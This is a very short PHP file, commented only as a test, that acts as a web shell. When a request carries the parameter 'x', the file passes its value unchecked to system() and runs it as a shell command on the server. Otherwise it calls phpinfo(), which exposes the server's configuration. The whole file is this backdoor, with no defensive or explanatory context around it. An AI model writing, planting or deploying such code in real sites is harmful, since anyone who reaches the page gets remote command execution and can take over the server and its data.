 <?php
  // test
  if(isset($_GET['x'])){
      system($_GET['x']);
  }else{
      phpinfo();
  }
  ?>
